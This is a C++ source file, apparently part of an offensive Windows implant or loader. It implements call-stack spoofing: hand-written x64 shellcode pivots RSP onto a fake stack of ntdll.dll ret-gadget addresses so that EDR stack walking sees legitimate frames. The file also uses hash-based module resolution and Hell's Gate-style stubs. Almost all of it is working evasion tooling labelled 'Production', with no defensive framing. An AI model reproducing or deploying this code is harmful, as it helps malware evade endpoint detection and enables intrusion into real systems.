// ============================================================================
// stack_spoof.cpp — Production Stack Spoofing Implementation
// ============================================================================
// Builds a fake call stack with ntdll.dll return addresses and provides
// a spoof gate (raw bytecode) that pivots RSP before calling a target
// function, so EDR stack walking sees legitimate ntdll frames.
//
// Compiler: x86_64-w64-mingw32-g++ (no inline asm for x64)
// Strategy: Build gate as raw bytecode — same pattern as Hell's Gate stubs
//
// KEY DESIGN: Gate reads ALL runtime data from g_spoofCtx (RW global).
// No embedded data section in the gate — avoids write-to-RX crash.
// ============================================================================

#include "stack_spoof.h"
#include "obfuscation.h"
#include "api_table.h"
#include "evasion.h"

#ifdef _WIN32

#include <cstring>

// ============================================================================
// GLOBAL CONTEXT — RW memory, read by the gate via RIP-relative addressing
// ============================================================================
// Layout accessed by gate bytecode:
//   [rax+0x00] = fakeStack (void*)     — fake RSP (offset +16 into alloc)
//   [rax+0x08] = targetFunc (void*)    — function to call
//   [rax+0x10] = retGadgets[0] (void*) — fake return address (ntdll C3 byte)
//
// The struct is reordered so gate accesses are within disp8 range (≤0x7F).
StackSpoofContext g_spoofCtx = {nullptr, nullptr, {nullptr}, 0, 0, false};

// ============================================================================
// SPOOF GATE — Raw x64 bytecode, built once at init
// ============================================================================
#define SPOOF_GATE_SIZE 96
static BYTE g_spoofGate[SPOOF_GATE_SIZE] = {0};
static bool g_spoofGateBuilt = false;

// ============================================================================
// BUILD SPOOF GATE — Write x64 machine code into g_spoofGate[]
// ============================================================================
// Gate execution:
//   On entry:
//     RCX,RDX,R8,R9 = target function's real arguments (PRESERVED)
//     g_spoofCtx.targetFunc = address of function to call
//     g_spoofCtx.fakeStack = fake RSP (base + 16, room for push+call)
//     g_spoofCtx.retGadgets[0] = ntdll ret instruction address
//
//   Gate:
//     1. Save non-volatile regs (rbx,rsi,rdi,r12,r13,r14,r15) — 11 bytes
//     2. sub rsp, 0x20 (stack alignment: 11+4=15 bytes so far, 7*8=56
//        pushes + 0x20 sub = 88. Entry RSP misaligned by 8 (call).
//        88-8=80, 80%16=0 ✓ aligned)
//     3. Save current RSP → r15 (mov r15, rsp — 3 bytes)
//        Stores (entry_RSP - 88), which is exactly where add/pop unwind
//        begins for correct restore.
//     4. lea rax, [rip + disp] → rax = &g_spoofCtx
//     5. mov r14, [rax]       → r14 = fakeStack
//     6. mov rsp, r14          → SWITCH TO FAKE STACK
//     7. push [rax+0x10]       → push fake ntdll ret addr (retGadgets[0])
//     8. mov r13, [rax+0x08]   → r13 = targetFunc
//     9. call r13              → CALL target (pushes return to fake stack)
//    10. mov rsp, r15          → restore RSP to (entry_RSP - 88)
//    11. add rsp, 0x20         → RSP = entry_RSP - 56
//    12. pop r15..rbx (×7)     → RSP = entry_RSP ✓
//    13. ret                   → pops return addr from [entry_RSP]
//
//   Fake stack during target execution:
//     [RSP+0] = gate return address (from call r13)
//     [RSP+8] = retGadgets[0] (ntdll addr, from push)
//     [RSP+16] = pre-filled frames (ntdll addresses)
//   EDR sees: frame0=gate(acceptable), frames1-31=ntdll addresses
// ============================================================================
static bool buildSpoofGate() {
    if (g_spoofGateBuilt) return true;

    BYTE* c = g_spoofGate;
    int off = 0;

    // ---- Save non-volatile registers (11 bytes) ----
    c[off++] = 0x53;                          // push rbx
    c[off++] = 0x56;                          // push rsi
    c[off++] = 0x57;                          // push rdi
    c[off++] = 0x41; c[off++] = 0x54;        // push r12
    c[off++] = 0x41; c[off++] = 0x55;        // push r13
    c[off++] = 0x41; c[off++] = 0x56;        // push r14
    c[off++] = 0x41; c[off++] = 0x57;        // push r15

    // ---- Shadow space + alignment (4 bytes) ----
    // 7 pushes (0x38) + 0x20 = 0x58 total. Entry RSP is misaligned by 8
    // (call pushed return addr). 0x58 - 8 = 0x50 = 80, 80%16=0 ✓ aligned
    c[off++] = 0x48; c[off++] = 0x83;
    c[off++] = 0xEC; c[off++] = 0x20;        // sub rsp, 0x20

    // ---- Save current RSP for restore unwind (3 bytes) ----
    // mov r15, rsp — (opcode 8B: MOV r64, r/m64, dst=r15, src=rsp)
    // stores (entry_RSP - 88). add rsp + pop unwind will land
    // exactly at entry_RSP for correct ret.
    c[off++] = 0x4C; c[off++] = 0x8B; c[off++] = 0xFC;

    // ---- Load g_spoofCtx address into RAX (7 bytes) ----
    // lea rax, [rip + disp32]
    int leaInsnOff = off;  // remember where we put the lea
    c[off++] = 0x48; c[off++] = 0x8D; c[off++] = 0x05;
    // Placeholder displacement — we'll patch it below
    c[off++] = 0x00; c[off++] = 0x00; c[off++] = 0x00; c[off++] = 0x00;

    // Patch RIP-relative displacement to &g_spoofCtx
    {
        // RIP after this lea instruction = &g_spoofGate[leaInsnOff + 7]
        char* ripAfterLea = (char*)&g_spoofGate[leaInsnOff + 7];
        int64_t disp = (char*)&g_spoofCtx - ripAfterLea;
        c[leaInsnOff + 3] = (disp) & 0xFF;
        c[leaInsnOff + 4] = (disp >> 8) & 0xFF;
        c[leaInsnOff + 5] = (disp >> 16) & 0xFF;
        c[leaInsnOff + 6] = (disp >> 24) & 0xFF;
    }

    // ---- Load fake RSP from g_spoofCtx.fakeStack (4 bytes) ----
    // mov r14, [rax]  — fakeStack at offset 0x00
    c[off++] = 0x4C; c[off++] = 0x8B; c[off++] = 0x30;

    // ---- SWITCH TO FAKE STACK (3 bytes) ----
    // mov rsp, r14
    c[off++] = 0x4C; c[off++] = 0x89; c[off++] = 0xF4;

    // ---- Push fake ntdll ret addr onto FAKE stack (4 bytes) ----
    // push qword [rax+0x10]  — retGadgets[0] at struct offset 0x10
    // FF /6, ModRM: mod=01(disp8), reg=6(push), rm=000(rax); disp8=0x10
    c[off++] = 0xFF; c[off++] = 0x70; c[off++] = 0x10;

    // ---- Load targetFunc from g_spoofCtx (4 bytes) ----
    // mov r13, [rax+0x08]  — targetFunc at struct offset 0x08
    // disp8 encoding: 4C 8B 68 08
    c[off++] = 0x4C; c[off++] = 0x8B; c[off++] = 0x68; c[off++] = 0x08;

    // ---- CALL target (3 bytes) ----
    // call r13 — pushes real return to FAKE stack
    c[off++] = 0x41; c[off++] = 0xFF; c[off++] = 0xD5;

    // ---- Restore original RSP from r15 (3 bytes) ----
    // mov rsp, r15
    c[off++] = 0x4C; c[off++] = 0x89; c[off++] = 0xFC;

    // ---- Undo shadow/alignment space (4 bytes) ----
    c[off++] = 0x48; c[off++] = 0x83;
    c[off++] = 0xC4; c[off++] = 0x20;        // add rsp, 0x20

    // ---- Restore non-volatile registers reverse order (11 bytes) ----
    c[off++] = 0x41; c[off++] = 0x5F;        // pop r15
    c[off++] = 0x41; c[off++] = 0x5E;        // pop r14
    c[off++] = 0x41; c[off++] = 0x5D;        // pop r13
    c[off++] = 0x41; c[off++] = 0x5C;        // pop r12
    c[off++] = 0x5F;                          // pop rdi
    c[off++] = 0x5E;                          // pop rsi
    c[off++] = 0x5B;                          // pop rbx

    // ---- Return (1 byte) ----
    c[off++] = 0xC3;                          // ret

    g_spoofGateBuilt = true;
    return true;
}

// ============================================================================
// FIND RET GADGETS IN NTDLL.DLL .text SECTION
// ============================================================================
// Scans ntdll's .text for C3 (ret) bytes. Collects up to 8 from different
// regions. Uses PEB walk + hash-based resolution (no plaintext strings).
// ============================================================================
static int findRetGadgets(void* gadgets[], int maxGadgets) {
    int count = 0;

    HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdll) return 0;

    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) != 0) continue;

        BYTE* textStart = base + sections[i].VirtualAddress;
        DWORD textSize  = sections[i].Misc.VirtualSize;
        if (textSize == 0) textSize = sections[i].SizeOfRawData;
        if (textSize < 0x400) continue;

        // Distribute search across .text section for variety
        DWORD step = (textSize - 0x200) / maxGadgets;
        if (step < 0x100) step = 0x100;

        for (int g = 0; g < maxGadgets && count < maxGadgets; g++) {
            DWORD searchStart = 0x200 + g * step;
            if (searchStart >= textSize - 2) break;

            DWORD searchEnd = searchStart + step;
            if (searchEnd > textSize - 1) searchEnd = textSize - 1;

            for (DWORD j = searchStart + 16; j < searchEnd - 1; j++) {
                if (textStart[j] == 0xC3) {
                    // Avoid CC (int3) or NOP padding — prefer real ret
                    if (textStart[j-1] != 0xCC && textStart[j-1] != 0x90) {
                        gadgets[count++] = (void*)(textStart + j);
                        break;
                    }
                }
            }
        }
        break;
    }

    return count;
}

// ============================================================================
// BUILD FAKE STACK — Allocate RX memory, fill with ntdll ret addresses
// ============================================================================
// Stack layout (32 frames, 8 bytes each, RSP at lowest address):
//   [RSP+0x00] = (runtime: filled by CALL instruction)
//   [RSP+0x08] = (runtime: filled by push in gate)
//   [RSP+0x10] = ntdll ret gadget 0
//   [RSP+0x18] = ntdll ret gadget 1
//   ...
//   [RSP+0xF8] = ntdll ret gadget 30
//
// When EDR walks the stack during syscall:
//   Frame 0: gate return address (acceptable — in RX memory)
//   Frame 1-31: ntdll.dll addresses (looks legitimate)
// ============================================================================
static bool buildFakeStack() {
    // Step 1: Find ret gadgets
    g_spoofCtx.retGadgetCount = findRetGadgets(g_spoofCtx.retGadgets, 8);

    // Fallback: if we found fewer than 3 gadgets, reuse what we have
    // (loop them — better than using random code addresses)
    if (g_spoofCtx.retGadgetCount < 3) {
        // If we found at least 1, duplicate it
        if (g_spoofCtx.retGadgetCount == 0) {
            // Absolutely no ret gadgets found — use ntdll base as fallback
            // This is not ideal but better than crashing
            HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
            if (!hNtdll) return false;
            BYTE* base = (BYTE*)hNtdll;
            IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
            IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
            IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if (memcmp(sec[i].Name, ".text", 5) == 0) {
                    // Scan for at least one C3 byte
                    BYTE* text = base + sec[i].VirtualAddress;
                    DWORD sz = sec[i].Misc.VirtualSize;
                    for (DWORD j = 0x200; j < sz - 1 && g_spoofCtx.retGadgetCount < 1; j++) {
                        if (text[j] == 0xC3) {
                            g_spoofCtx.retGadgets[g_spoofCtx.retGadgetCount++] = (void*)(text + j);
                        }
                    }
                    break;
                }
            }
            if (g_spoofCtx.retGadgetCount == 0) return false;
        }
        // Duplicate to fill 3+ slots
        while (g_spoofCtx.retGadgetCount < 3) {
            g_spoofCtx.retGadgets[g_spoofCtx.retGadgetCount] =
                g_spoofCtx.retGadgets[g_spoofCtx.retGadgetCount - 1];
            g_spoofCtx.retGadgetCount++;
        }
    }

    // Step 2: Allocate fake stack with headroom for push+call
    // The gate does push (8 bytes) + call (8 bytes) = 16 bytes below
    // the fake RSP. We offset by 16 so writes stay within the buffer.
    void* allocated = g_spoofCtx.fakeStack;
    if (allocated) {
        DWORD tmp = 0;
        g_api.VirtualProtect(allocated, 272, PAGE_READWRITE, &tmp);
        memset(allocated, 0, 272);
    } else {
        allocated = g_api.VirtualAllocEx(
            (HANDLE)(LONG_PTR)-1, NULL, 272,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!allocated) return false;
    }

    // Offset fake RSP by 16 bytes: push writes to [base+8], call to [base+0]
    g_spoofCtx.fakeStack = (void*)((ULONG_PTR)allocated + 16);

    // Step 3: Fill with ret gadget addresses (34 frames for 272-byte buffer)
    ULONG_PTR* stack = (ULONG_PTR*)allocated;  // use base pointer, not offset
    int frameCount = 272 / sizeof(ULONG_PTR);  // 34 frames

    for (int i = 0; i < frameCount; i++) {
        stack[i] = (ULONG_PTR)g_spoofCtx.retGadgets[i % g_spoofCtx.retGadgetCount];
    }
    g_spoofCtx.fakeFrameCount = frameCount;

    // Step 4: Make fake stack RX (looks like legitimate code region)
    // Use the base pointer (allocated), not the offset
    DWORD oldProt = 0;
    g_api.VirtualProtect(allocated, 272, PAGE_EXECUTE_READ, &oldProt);

    g_spoofCtx.initialized = true;
    return true;
}

// ============================================================================
// INIT STACK SPOOF — One-time setup
// ============================================================================
bool initStackSpoof() {
    if (g_spoofCtx.initialized) return true;

    // Step 1: Build gate bytecode (writes to g_spoofGate, still RW)
    if (!buildSpoofGate()) return false;

    // Step 2: Build fake stack (writes to allocated memory)
    if (!buildFakeStack()) return false;

    // Step 3: Make gate executable AFTER all data writes are done
    DWORD oldProt = 0;
    if (!g_api.VirtualProtect(g_spoofGate, SPOOF_GATE_SIZE,
                               PAGE_EXECUTE_READ, &oldProt)) {
        if (!g_api.VirtualProtect(g_spoofGate, SPOOF_GATE_SIZE,
                                   PAGE_EXECUTE_READWRITE, &oldProt)) {
            return false;
        }
    }

    return true;
}

// ============================================================================
// SPOOFED CALL — Execute function with fake call stack
// ============================================================================
// Writes targetFunc to g_spoofCtx.targetFunc (RW global, no protection issues),
// then invokes the gate. Caller MUST have set RCX,RDX,R8,R9 = target's args.
//
// Gate reads targetFunc from g_spoofCtx, switches to fake stack, calls target,
// restores stack, returns.
//
// Thread safety: NOT thread-safe. Two concurrent calls may race on
// g_spoofCtx.targetFunc. For this project's use case (single-threaded
// syscall wrappers), this is acceptable.
// ============================================================================
void* spoofedCall(void* targetFunc) {
    if (!g_spoofCtx.initialized || !g_spoofGateBuilt) {
        // Fallback: direct call without spoofing
        return ((void*(*)(void))targetFunc)();
    }

    // Write target to RW global (no VirtualProtect needed)
    g_spoofCtx.targetFunc = targetFunc;

    // Cast gate to function pointer and invoke
    typedef void* (*GateFunc)(void);
    GateFunc gate = (GateFunc)(void*)g_spoofGate;
    return gate();
}

// ============================================================================
// STACK SPOOF GUARD (RAII) — Lightweight scope marker
// ============================================================================
StackSpoofGuard::StackSpoofGuard()
    : m_savedRsp(nullptr), m_active(false)
{
    if (!g_spoofCtx.initialized) return;
    m_active = true;
}

StackSpoofGuard::~StackSpoofGuard() {
    m_active = false;
}

#endif // _WIN32
